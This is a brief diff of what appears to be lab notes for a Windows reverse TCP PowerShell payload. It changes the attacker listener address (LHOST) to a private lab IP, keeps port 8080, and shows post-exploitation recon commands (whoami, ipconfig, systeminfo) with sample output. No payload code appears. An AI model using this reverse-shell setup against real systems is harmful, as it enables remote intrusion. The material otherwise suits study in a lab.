@@ -2,7 +2,7 @@
 
 ## ⚙️ Setup Info
 - **Payload:** `windows/reverse_tcp/powershell`
-- **LHOST:** 10.0.2.15
+- **LHOST:** 192.168.56.11
 - **LPORT:** 8080
 
 ## 🔁 Payload Delivery Method
@@ -36,7 +36,7 @@ whoami
 
 # Checking network configuration
 ipconfig
-# Output: IPv4 Address. . . . . . . . . . . : 10.0.2.16
+# Output: IPv4 Address. . . . . . . . . . . : 192.168.56.1
 
 # Gathering system information
 systeminfo
